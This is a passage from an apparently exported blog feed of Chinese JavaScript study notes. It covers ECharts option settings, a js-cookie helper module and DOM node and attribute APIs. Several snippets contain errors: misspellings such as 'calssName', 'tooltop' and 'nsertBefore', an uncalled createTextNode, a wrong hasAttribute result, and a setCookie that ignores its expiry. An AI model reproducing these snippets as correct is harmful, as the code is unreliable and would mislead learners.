<span class="attr">alignWithLabel</span>:<span class="literal">false</span>,	<span class="comment">// false-刻度线和标签不对齐 true-刻度线和标签对齐</span></span><br><span class="line">		<span class="attr">inside</span>:<span class="literal">false</span>,			<span class="comment">// 坐标轴刻度是否朝内，默认朝外 true-朝内 false-朝外</span></span><br><span class="line">		<span class="attr">lineStyle</span>:&#123;&#125;,			<span class="comment">// 刻度线样式</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">axisLabel</span>:&#123;	<span class="comment">// 坐标轴刻度标签的相关设置</span></span><br><span class="line">		<span class="attr">show</span>:<span class="literal">true</span>,			   <span class="comment">// 是否显示刻度标签</span></span><br><span class="line">		<span class="attr">margin</span>:<span class="number">8</span>,			   <span class="comment">// 刻度标签与轴线之间的距离</span></span><br><span class="line">		<span class="attr">color</span>:<span class="string">&#x27;&#x27;</span>,			   <span class="comment">// 刻度标签文字的颜色</span></span><br><span class="line">		<span class="attr">data</span>:[],			   <span class="comment">// 类目数据，在类目轴（type: &#x27;category&#x27;）中有效</span></span><br><span class="line">		<span class="comment">// formatter: &#x27;&#123;value&#125; kg&#x27;,  // 使用字符串模板，模板变量为刻度默认标签 &#123;value&#125;</span></span><br><span class="line">		<span class="comment">// 或</span></span><br><span class="line">		<span class="comment">// formatter: function (value, index) &#123;  // 使用函数模板，函数参数分别为刻度数值（类目），刻度的索引</span></span><br><span class="line">		<span class="comment">//    return value + &#x27;kg&#x27;;</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">axisPointer</span>:&#123;			<span class="comment">// 坐标轴指示器配置项,鼠标滑过显示数据</span></span><br><span class="line">		 <span class="attr">show</span>:<span class="literal">true</span>,			<span class="comment">// 显示隐藏</span></span><br><span class="line">		 <span class="attr">type</span>:<span class="string">&#x27;&#x27;</span>,			<span class="comment">// 指示器类型,line-直线指示器 shadow-阴影指示器 none-无指示器</span></span><br><span class="line">		 <span class="attr">label</span>:&#123;			<span class="comment">// 坐标轴指示器的文本标签</span></span><br><span class="line">			<span class="attr">formatter</span>: <span class="string">&#x27;&#x27;</span>,  <span class="comment">// 文本标签文字的格式化器 &#123;value&#125; 为轴的值</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ......更多请看官网</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5、yAxis">5、yAxis</h2>
<p>图标的 y 轴，与上面 xAxis 一样，xAxis 有的配置项，yAxis 也有，参考上面即可</p>
<h2 id="6、tooltip">6、tooltip</h2>
<p>提示框组件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">tooltop</span>:&#123;</span><br><span class="line">	 <span class="attr">show</span>:<span class="literal">true</span>,			<span class="comment">// 显示/隐藏</span></span><br><span class="line">	 <span class="attr">trigger</span>:<span class="string">&#x27;&#x27;</span>      	<span class="comment">// 触发类型 item-数据项图形触发 axis-坐标轴触发 none-什么都不触发</span></span><br><span class="line">	 <span class="attr">axisPointer</span>:&#123;&#125;,	<span class="comment">// 坐标轴指示器配置项</span></span><br><span class="line">	 <span class="comment">// ......更多请看官网</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="7、toolbox">7、toolbox</h2>
<p>工具栏，这里就不写了，看看官网就行</p>
<h2 id="8、series">8、series</h2>
<p>重头戏在这个，series 可以嵌套多个对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">series</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// line-折线/面积图</span></span><br><span class="line">    <span class="comment">// bar-柱形图</span></span><br><span class="line">    <span class="comment">// pie-饼图</span></span><br><span class="line">    <span class="comment">// radar-雷达图</span></span><br><span class="line">    <span class="comment">// gauge-仪表盘</span></span><br><span class="line">    <span class="comment">// .......目前本人用过就这些，其他还得看官网，这里并未盖全</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 系列名称，用于tooltip的显示(就是鼠标滑过出现)</span></span><br><span class="line">    <span class="attr">colorBy</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// series-同一系列中的所有数据都是用相同的颜色 data-每个数据项都使用不同的颜色</span></span><br><span class="line">    <span class="attr">symbol</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 标记的图形 circle-圆形 rect-正方形 也可以传svg或png......还是看官网演示吧</span></span><br><span class="line">    <span class="attr">symbolSize</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 标记图形的大小 可以是 number Array Function</span></span><br><span class="line">    <span class="attr">symbolRotate</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 标记的旋转角度（而非弧度）可以是 number Function</span></span><br><span class="line">    <span class="attr">symbolKeepAspect</span>: <span class="literal">true</span>, <span class="comment">// 如果 symbol 是 path:// 的形式，是否在缩放时保持该图形的长宽比</span></span><br><span class="line">    <span class="attr">stack</span>: <span class="literal">true</span>, <span class="comment">// 数据堆叠，这个还没用过</span></span><br><span class="line">    <span class="attr">connectNulls</span>: <span class="literal">false</span>, <span class="comment">// 是否连接空数据</span></span><br><span class="line">    <span class="attr">clip</span>: <span class="literal">true</span>, <span class="comment">// 是否裁剪超出坐标系部分的图形</span></span><br><span class="line">    <span class="attr">step</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 是否是阶梯线图 可以设置为 true 显示成阶梯线图，也支持设置成 &#x27;start&#x27;, &#x27;middle&#x27;, &#x27;end&#x27;</span></span><br><span class="line">    <span class="attr">label</span>: &#123;</span><br><span class="line">      <span class="comment">// 图形上的文本标签</span></span><br><span class="line">      <span class="attr">show</span>: <span class="literal">true</span>, <span class="comment">// 是否显示标签</span></span><br><span class="line">      <span class="attr">position</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 标签的位置 可以是 string Array</span></span><br><span class="line">      <span class="attr">distance</span>: <span class="number">0</span>, <span class="comment">// 距离图形元素的距离</span></span><br><span class="line">      <span class="attr">rotate</span>: <span class="number">90</span>, <span class="comment">// 标签旋转</span></span><br><span class="line">      <span class="attr">offset</span>: [<span class="number">10</span>, <span class="number">10</span>], <span class="comment">// 是否对文字进行偏移</span></span><br><span class="line">      <span class="attr">formatter</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 标签内容格式器 string Function &#123;a&#125;：系列名 &#123;b&#125;：数据名 &#123;c&#125;：数据值</span></span><br><span class="line">      <span class="attr">color</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 颜色</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">labelLine</span>: &#123;</span><br><span class="line">      <span class="comment">// 标签的视觉引导线配置</span></span><br><span class="line">      <span class="attr">show</span>: <span class="literal">true</span>, <span class="comment">// 是否显示视觉引导线</span></span><br><span class="line">      <span class="attr">showAbove</span>: <span class="literal">true</span>, <span class="comment">// 是否显示在图形上方</span></span><br><span class="line">      <span class="attr">smooth</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 是否平滑视觉引导线，默认不平滑 设置成 true 平滑显示，设置为 0 到 1 的值，表示平滑程度</span></span><br><span class="line">      <span class="attr">lineStyle</span>: &#123;&#125;, <span class="comment">// 设置标签视觉引导线的样式</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">lineStyle</span>: &#123;</span><br><span class="line">      <span class="comment">// 线条样式</span></span><br><span class="line">      <span class="attr">color</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 线的颜色</span></span><br><span class="line">      <span class="attr">width</span>: <span class="number">2</span>, <span class="comment">// 线宽</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">areaStyle</span>: &#123;</span><br><span class="line">      <span class="comment">// 区域填充样式。设置后显示成区域面积图。</span></span><br><span class="line">      <span class="attr">color</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 填充的颜色</span></span><br><span class="line">      <span class="attr">origin</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// 图形区域的起始位置 auto-默认 start-底部 end-顶部 number 填充指定数值到数据间的区域</span></span><br><span class="line">      <span class="attr">opacity</span>: <span class="number">1</span>, <span class="comment">// 图形透明度 0-1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">emphasis</span>: &#123;</span><br><span class="line">      <span class="comment">// 折线图的高亮状态</span></span><br><span class="line">      <span class="attr">focus</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// none-不淡出其它图形 self-只聚焦（不淡出） series-聚焦当前高亮的数据</span></span><br><span class="line">      <span class="attr">blurScope</span>: <span class="string">&#x27;&#x27;</span>, <span class="comment">// coordinateSystem-淡出范围为坐标系 series-淡出范围为系列  global-淡出范围为全局</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// .......更多请看官网</span></span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>写多了不难发现几个常见的属性值（请记住这个几个属性）：</p>
<ul>
<li><strong>lineStyle</strong>：线条样式</li>
<li><strong>splitNumber</strong>：分割段数</li>
<li><strong>axisLine</strong>：轴线相关配置</li>
<li><strong>splitLine</strong>：分隔线样式</li>
<li><strong>axisTick</strong>：刻度样式</li>
<li><strong>axisLabel</strong>：刻度标签</li>
<li><strong>itemStyle</strong>：图形样式</li>
<li><strong>label</strong> ：图形上的文本标签，可用于说明图形的一些数据信息，比如值，名称等</li>
<li><strong>labelLine</strong>：标签的视觉引导线配置</li>
</ul>
<p>每个 type 的选项不同，但这几个属性值几乎每个都包含有，有些配置可能会有些差异。用多几次，你会发现有些属性可以写在局部，也可以写在全局，如: <strong>textStyle</strong> , <strong>lineStyle</strong> ……这些都是设置图标样式的，设置样式的属性一般可以在很多地方可以看到，就像在套娃哈哈哈。可以看看实例，你想画什么图直接看示例，然后点进去修改，改到符合自己的样式，多练几次手应该就差不多熟悉了。另外，本人写有一些例子可供参考练手：</p>
<p><a href="https://gitee.com/xie392/echarts">Gitee 地址</a></p>
<p><a href="https://xie392.gitee.io/echarts/">演示地址</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>js-cookie封装</title>
    <url>/JavaScript/js-cookie%E5%B0%81%E8%A3%85/</url>
    <content><![CDATA[<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Cookies</span> <span class="keyword">from</span> <span class="string">&#x27;js-cookie&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取token</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">key: string</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Cookies</span>.<span class="title function_">get</span>(key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置token</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">key: string, value: string, expire: number = <span class="number">7</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Cookies</span>.<span class="title function_">set</span>(key, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除token</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeCookie</span>(<span class="params">key: string</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Cookies</span>.<span class="title function_">remove</span>(key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置过期时间</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">setCookieExpire</span>(<span class="params">key: string, token: string, expire: number</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Cookies</span>.<span class="title function_">set</span>(key, token, &#123; <span class="attr">expires</span>: expire &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 cookie 内所有的过期时间 如果不传入 expire 则默认为 1年</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">setAllCookieExpire</span>(<span class="params">expire: number = <span class="number">365</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Cookies</span>.<span class="title function_">get</span>())</span><br><span class="line">  keys.<span class="title function_">forEach</span>(<span class="function">(<span class="params">key: string</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Cookies</span>.<span class="title function_">set</span>(key, <span class="title class_">Cookies</span>.<span class="title function_">get</span>(key), &#123; <span class="attr">expires</span>: expire &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否登录</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">isLogin</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Cookies</span>.<span class="title function_">get</span>(<span class="string">&#x27;TOKEN&#x27;</span>) ? <span class="literal">true</span> : <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除所有 cookie</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">clearAllCookie</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Cookies</span>.<span class="title function_">get</span>())</span><br><span class="line">  keys.<span class="title function_">forEach</span>(<span class="function">(<span class="params">key: string</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Cookies</span>.<span class="title function_">remove</span>(key)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>js笔记-DOM对象</title>
    <url>/JavaScript/js-dom/</url>
    <content><![CDATA[<h3 id="节点">节点</h3>
<blockquote>
<p>文档本身是文档节点<br>
所有 HTML 元素是元素节点<br>
所有 HTML 属性是属性节点<br>
HTML 元素内的文本是文本节点<br>
注释是注释节点</p>
</blockquote>
<h3 id="1-元素节点">1.元素节点</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">parentNode</td>
<td style="text-align:left">获取父节点,包括文本节点和注释节点</td>
</tr>
<tr>
<td style="text-align:left">firstChild</td>
<td style="text-align:left">获取第一个子节点</td>
</tr>
<tr>
<td style="text-align:left">lastChild</td>
<td style="text-align:left">获取最后一个子节点</td>
</tr>
<tr>
<td style="text-align:left">nextSibling</td>
<td style="text-align:left">获取下一个同胞节点</td>
</tr>
<tr>
<td style="text-align:left">previousSibling</td>
<td style="text-align:left">获取上一个同胞节点</td>
</tr>
<tr>
<td style="text-align:left">parentElement</td>
<td style="text-align:left">获取父元素版本节点，不包括文本节点和注释节点</td>
</tr>
<tr>
<td style="text-align:left">firstElementChild</td>
<td style="text-align:left">获取第一个子节点的元素版本</td>
</tr>
<tr>
<td style="text-align:left">lastElementChild</td>
<td style="text-align:left">获取最后一个子节点的元素版本</td>
</tr>
<tr>
<td style="text-align:left">nextElementSibling</td>
<td style="text-align:left">获取下一个同胞节点的元素版本</td>
</tr>
<tr>
<td style="text-align:left">previousElementSibling</td>
<td style="text-align:left">获取上一个同胞节点的元素版本</td>
</tr>
</tbody>
</table>
<p>例子:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;text&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第1个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第2个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第3个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第4个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第5个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>这是第6个li<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;p&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> ele = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;list&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;父节点=&gt;&#x27;</span>, ele.<span class="property">parentNode</span>) <span class="comment">// div#box</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;第一个子节点=&gt;&#x27;</span>, ele.<span class="property">firstChild</span>) <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;最后一个子节点=&gt;&#x27;</span>, ele.<span class="property">lastChild</span>) <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;上一个同胞节点=&gt;&#x27;</span>, ele.<span class="property">previousSibling</span>) <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;上一个同胞节点=&gt;&#x27;</span>, ele.<span class="property">previousSibling</span>) <span class="comment">// #text</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;父元素版本节点=&gt;&#x27;</span>, ele.<span class="property">parentElement</span>) <span class="comment">// div#box</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;第一个元素节点=&gt;&#x27;</span>, ele.<span class="property">firstElementChild</span>) <span class="comment">// li.item</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;最后一个元素节点=&gt;&#x27;</span>, ele.<span class="property">lastElementChild</span>) <span class="comment">// li.item</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;上一个同胞元素节点=&gt;&#x27;</span>, ele.<span class="property">previousElementSibling</span>) <span class="comment">// p#text</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;下一个同胞元素节点=&gt;&#x27;</span>, ele.<span class="property">nextElementSibling</span>) <span class="comment">// div#p</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-获取或插入内容">2.获取或插入内容</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">innerHTML</td>
<td style="text-align:left">获取元素内部的所有内容 (包括文本和元素)</td>
</tr>
<tr>
<td style="text-align:left">innerText</td>
<td style="text-align:left">获取元素内部的文本内容 (只获取文本不获取元素)</td>
</tr>
<tr>
<td style="text-align:left">textContent</td>
<td style="text-align:left">获取元素内部的文本内容 (只获取文本不获取元素)</td>
</tr>
</tbody>
</table>
<h3 id="3-获取元素属性">3.获取元素属性</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">getAttributeNode()</td>
<td style="text-align:left">获取元素属性节点</td>
</tr>
<tr>
<td style="text-align:left">getAttribute()</td>
<td style="text-align:left">获取元素属性的属性值</td>
</tr>
<tr>
<td style="text-align:left">setAttribute()</td>
<td style="text-align:left">设置元素属性的属性值</td>
</tr>
<tr>
<td style="text-align:left">removeAttribute()</td>
<td style="text-align:left">删除元素的属性</td>
</tr>
<tr>
<td style="text-align:left">hasAttribute()</td>
<td style="text-align:left">判断元素是否具有某个属性</td>
</tr>
</tbody>
</table>
<p>例子:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">getAttributeNode</span>(<span class="string">&#x27;id&#x27;</span>)) <span class="comment">// div, typeof = &quot;Object&quot;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">getAttribute</span>(<span class="string">&#x27;id&#x27;</span>)) <span class="comment">// div, typeof = &quot;string&quot;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">setAttribute</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;dd&#x27;</span>)) <span class="comment">// undefined, 修改id为dd</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">removeAttribute</span>(<span class="string">&#x27;id&#x27;</span>)) <span class="comment">// undefined, 删除id</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(div.<span class="title function_">hasAttribute</span>(<span class="string">&#x27;id&#x27;</span>)) <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="4-创建或插入节点">4.创建或插入节点</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">createTextNode()</td>
<td style="text-align:left">创建文本节点</td>
</tr>
<tr>
<td style="text-align:left">createElement()</td>
<td style="text-align:left">创建元素节点</td>
</tr>
<tr>
<td style="text-align:left">appendChild()</td>
<td style="text-align:left">把节点插入到元素内部的结尾部分</td>
</tr>
<tr>
<td style="text-align:left">nsertBefore()</td>
<td style="text-align:left">把节点插入到元素内部的指定元素的前面</td>
</tr>
<tr>
<td style="text-align:left">removeChild()</td>
<td style="text-align:left">在节点中移除指定的子节点</td>
</tr>
<tr>
<td style="text-align:left">remove()</td>
<td style="text-align:left">移除本身</td>
</tr>
<tr>
<td style="text-align:left">replaceChild()</td>
<td style="text-align:left">用新的节点替换旧的节点</td>
</tr>
<tr>
<td style="text-align:left">cloneNode()</td>
<td style="text-align:left">克隆节点</td>
</tr>
<tr>
<td style="text-align:left">crateDocumentFragment()</td>
<td style="text-align:left">创建临时文档，虚拟 DOM 节点</td>
</tr>
</tbody>
</table>
<p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> h1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line">h1.<span class="property">textContent</span> = <span class="string">&#x27;这是一个创建的标题标签&#x27;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(h1)</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(h1)</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(h1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> text = <span class="variable language_">document</span>.<span class="property">createTextNode</span></span><br><span class="line">text.<span class="property">textContent</span> = <span class="string">&#x27;这是一个创建的文本&#x27;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(text)</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(text)</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(text)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传递一个可选的参数决定是否要拷贝子节点(默认: false不拷贝子节点) (true拷贝子节点)</span></span><br><span class="line"><span class="keyword">var</span> cloneNode = text.<span class="title function_">cloneNode</span>(<span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
<h3 id="5-其它">5.其它</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">element.nodeName</td>
<td style="text-align:left">获取节点名字（大写)</td>
</tr>
<tr>
<td style="text-align:left">element.calssName</td>
<td style="text-align:left">设置或获取节点类名</td>
</tr>
<tr>
<td style="text-align:left"><a href="http://element.id">element.id</a></td>
<td style="text-align:left">设置或获取节点 id</td>
</tr>
<tr>
<td style="text-align:left">element.style</td>
<td style="text-align:left">设置或获取节点样式</td>
</tr>
<tr>
<td style="text-align:left">element.dataset</td>
<td style="text-align:left">设置自定义属性</td>
</tr>
<tr>
<td style="text-align:left">element.classList.add()</td>
<td style="text-align:left">添加类名</td>
</tr>
<tr>
<td style="text-align:left">element.classList.toggle()</td>
<td style="text-align:left">切换类名</td>
</tr>
<tr>
<td style="text-align:left">element.classList.remove()</td>
<td style="text-align:left">移除类名</td>
</tr>
<tr>
<td style="text-align:left">element.classList.replace()</td>
<td style="text-align:left">替换类名</td>
</tr>
<tr>
<td style="text-align:left">element.offsetHeight</td>
<td style="text-align:left">返回元素的高度</td>
</tr>
<tr>
<td style="text-align:left">element.offsetTop</td>
<td style="text-align:left">返回元素的垂直偏移位置</td>
</tr>
<tr>
<td style="text-align:left">element.scrollTop</td>
<td style="text-align:left">返回元素上边缘与视图之间的距离</td>
</tr>
<tr>
<td style="text-align:left">element.clientHeight</td>
<td style="text-align:left">返回元素的可见高度</td>
</tr>
<tr>
<td style="text-align:left">element.offsetTop</td>
<td style="text-align:left">返回元素的垂直偏移位置</td>
</tr>
</tbody>
</table>
<p>例子:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;box&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">class</span>=<span class="string">&quot;div&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">data-id</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">parentNode</span>) <span class="comment">// DIV</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">calssName</span>) <span class="comment">// div</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">id</span>) <span class="comment">// box</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(box.<span class="property">dataset</span>.<span class="property">id</span>) <span class="comment">// 1</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 设置类名(会把所有类名覆盖)</span></span></span><br><span class="line"><span class="language-javascript">  box.<span class="property">calssName</span> = <span class="string">&#x27;newCalss&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 设置id(会把所有id覆盖)</span></span></span><br><span class="line"><span class="language-javascript">  box.<span class="property">id</span> = <span class="string">&#x27;newId&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 设置样式</span></span></span><br><span class="line"><span class="language-javascript">  box.<span class="property">style</span>.<span class="property">background</span> = 